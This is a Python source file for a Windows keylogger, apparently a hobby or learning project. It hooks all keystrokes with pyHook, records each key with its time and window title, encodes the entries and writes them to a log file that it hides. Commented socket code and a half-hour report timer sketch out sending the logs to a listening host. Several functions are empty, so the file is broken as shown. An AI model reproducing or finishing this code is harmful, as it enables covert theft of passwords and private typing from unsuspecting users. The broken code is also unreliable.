import pyHook, pythoncom, socket,os
import threading
from src import base64cipher
##create a server how lisen the attact host
# server = socket.socket()
#
# server.bind("127.0.0.1", 5555)
# server.listen(1)
# c,a = server.accept()
filepath="log.txt"
#turn file to hidden
def hide():
    p = os.popen('attrib +h ' + filepath)
    t = p.read()
    p.close()

def opensocket():


##create a server how lisen the attact host
# server = socket.socket()
#
# server.bind("127.0.0.1", 5555)
# server.listen(1)
# c,a = server.accept()

def onKeyDown(e):
    s =f"{e.GetKey()} \t {e.Time} \t {e.WindowName}"
    # c.send(s.encode())
    writeToFile(s)
    return 1

def writeToFile(s):
    file = open(filepath, "a")
    msg = encodeTXT(s)
    file.write(msg)

def encodeTXT(s):
    return base64cipher.encodeMsg(s)

def start():
    hide()
    opensocket()
    hm = pyHook.HookManager()
    hm.HookKeyboard()
    #evry evend from the keybord will pawer onKeyDown function
    hm.SubscribeKeyDown(onKeyDown)
    pythoncom.PumpMessages()

def send():
    # something
def report():
    send()
    threading.Timer(1800, report).start()

start()
# hm=pyHook.HookManager()
# hm.HookKeyboard()
#
# #evry evend from the keybord will pawer onKeyDown function
# hm.SubscribeKeyDown(onKeyDown)
#
# #make the consol stay even there is no event
# pythoncom.PumpMessages()
